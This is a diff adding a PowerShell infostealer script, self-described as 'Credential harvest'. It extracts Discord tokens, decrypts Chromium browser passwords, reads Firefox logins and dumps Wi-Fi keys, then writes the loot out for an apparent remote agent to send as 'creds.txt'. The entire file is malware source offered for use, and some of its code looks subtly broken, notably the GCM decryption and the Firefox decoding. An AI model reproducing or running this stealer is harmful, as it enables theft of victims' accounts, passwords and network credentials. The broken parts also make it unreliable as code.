@@ -1,0 +1,174 @@
+<#
+.SYNOPSIS
+    Credential harvest: Discord token, browser passwords, Wi-Fi profiles.
+.OUTPUT
+    Writes collected data to stdout, prefixed with FILE:creds.txt for the agent.
+#>
+
+$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
+
+# ------------------------------------------------------------
+# 1. Discord token extraction
+# ------------------------------------------------------------
+$discordTokens = @()
+
+# Local Storage (all Discord variants)
+$localAppData = [Environment]::GetFolderPath('LocalApplicationData')
+$discordDirs = @(
+    "$localAppData\Discord",
+    "$localAppData\DiscordCanary",
+    "$localAppData\DiscordPTB",
+    "$localAppData\DiscordDevelopment",
+    "$env:APPDATA\Discord",
+    "$env:APPDATA\DiscordCanary",
+    "$env:APPDATA\DiscordPTB",
+    "$env:APPDATA\DiscordDevelopment"
+)
+
+foreach ($dir in $discordDirs) {
+    $leveldb = Join-Path $dir "Local Storage\leveldb"
+    if (Test-Path $leveldb) {
+        Get-ChildItem -Path $leveldb -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+            if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
+                $discordTokens += $matches[0]
+            }
+        }
+        # Also check .log files
+        Get-ChildItem -Path $leveldb -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+            if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
+                $discordTokens += $matches[0]
+            }
+        }
+    }
+}
+
+# DiscordCanary / PTB sometimes store token in a settings file
+$discordSettingsPaths = @(
+    "$env:APPDATA\discord\settings.json",
+    "$env:APPDATA\discordcanary\settings.json",
+    "$env:APPDATA\discordptb\settings.json"
+)
+foreach ($path in $discordSettingsPaths) {
+    if (Test-Path $path) {
+        $json = Get-Content $path -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json
+        if ($json.token) { $discordTokens += $json.token }
+    }
+}
+
+$discordTokens = $discordTokens | Select-Object -Unique
+
+# ------------------------------------------------------------
+# 2. Browser saved passwords (Chromium & Firefox)
+# ------------------------------------------------------------
+$browserPasswords = @()
+
+# Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.)
+$chromePaths = @(
+    [System.IO.Path]::Combine($env:LOCALAPPDATA, "Google\Chrome\User Data"),
+    [System.IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft\Edge\User Data"),
+    [System.IO.Path]::Combine($env:LOCALAPPDATA, "BraveSoftware\Brave-Browser\User Data"),
+    [System.IO.Path]::Combine($env:APPDATA, "Opera Software\Opera Stable")
+)
+
+foreach ($path in $chromePaths) {
+    $statePath = Join-Path $path "Local State"
+    if (Test-Path $statePath) {
+        $localState = Get-Content $statePath -Raw | ConvertFrom-Json
+        $encKeyB64 = $localState.os_crypt.encrypted_key
+        if ($encKeyB64) {
+            $encKey = [System.Convert]::FromBase64String($encKeyB64)
+            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..$encKey.Length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+            $loginData = Join-Path $path "Default\Login Data"
+            if (Test-Path $loginData) {
+                $tempDb = [System.IO.Path]::GetTempFileName() + ".db"
+                Copy-Item $loginData $tempDb -Force
+                try {
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $encPwd = $reader.GetValue(2)
+                        if ($encPwd -and $encPwd.Length -gt 3) {
+                            # AES-GCM decrypt
+                            $iv = $encPwd[3..14]
+                            $ciphertext = $encPwd[15..($encPwd.Length - 17)]
+                            $tag = $encPwd[($encPwd.Length - 16)..($encPwd.Length - 1)]
+                            $aes = [System.Security.Cryptography.Aes]::Create()
+                            $aes.Key = $masterKey
+                            $aes.IV = $iv
+                            $aes.Mode = [System.Security.Cryptography.CipherMode]::GCM
+                            $plain = $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+                            $browserPasswords += [PSCustomObject]@{
+                                Browser = (Split-Path $path -Leaf)
+                                URL     = $reader.GetString(0)
+                                User    = $reader.GetString(1)
+                                Pass    = [System.Text.Encoding]::UTF8.GetString($plain)
+                            }
+                        }
+                    }
+                    $conn.Close()
+                } catch { }
+                Remove-Item $tempDb -Force
+            }
+        }
+    }
+}
+
+# Firefox
+$firefoxProfiles = [System.IO.Path]::Combine($env:APPDATA, "Mozilla\Firefox\Profiles")
+if (Test-Path $firefoxProfiles) {
+    $profiles = Get-ChildItem $firefoxProfiles -Directory
+    foreach ($profile in $profiles) {
+        $loginsFile = Join-Path $profile.FullName "logins.json"
+        if (Test-Path $loginsFile) {
+            $logins = Get-Content $loginsFile -Raw | ConvertFrom-Json
+            foreach ($login in $logins.logins) {
+                $user = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($login.encryptedUsername ?? ""))
+                $pass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($login.encryptedPassword ?? ""))
+                $browserPasswords += [PSCustomObject]@{
+                    Browser = "Firefox"
+                    URL     = $login.hostname
+                    User    = $user
+                    Pass    = $pass
+                }
+            }
+        }
+    }
+}
+
+# ------------------------------------------------------------
+# 3. Wi-Fi profiles and passwords
+# ------------------------------------------------------------
+$wifiProfiles = @()
+try {
+    $profiles = netsh wlan show profiles | Select-String ":\s+(.+)" | ForEach-Object { $_.Matches.Groups[1].Value }
+    foreach ($profile in $profiles) {
+        $key = netsh wlan show profile "$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+        if (-not $key) { $key = "[No password]" }
+        $wifiProfiles += [PSCustomObject]@{ SSID = $profile; Password = $key }
+    }
+} catch {}
+
+# ------------------------------------------------------------
+# 4. Assemble output
+# ------------------------------------------------------------
+$output = "==================== DISCORD TOKENS ====================" + "`r`n"
+foreach ($t in $discordTokens) { $output += "$t`r`n" }
+$output += "`r`n==================== BROWSER PASSWORDS ====================`r`n"
+foreach ($cred in $browserPasswords) {
+    $output += "Browser: $($cred.Browser) | URL: $($cred.URL) | User: $($cred.User) | Pass: $($cred.Pass)`r`n"
+}
+$output += "`r`n==================== WI-FI PROFILES ====================`r`n"
+foreach ($w in $wifiProfiles) {
+    $output += "SSID: $($w.SSID) | Password: $($w.Password)`r`n"
+}
+
+# Write with FILE: prefix so agent sends as file
+Write-Output "FILE:creds.txt"
+Write-Output $output
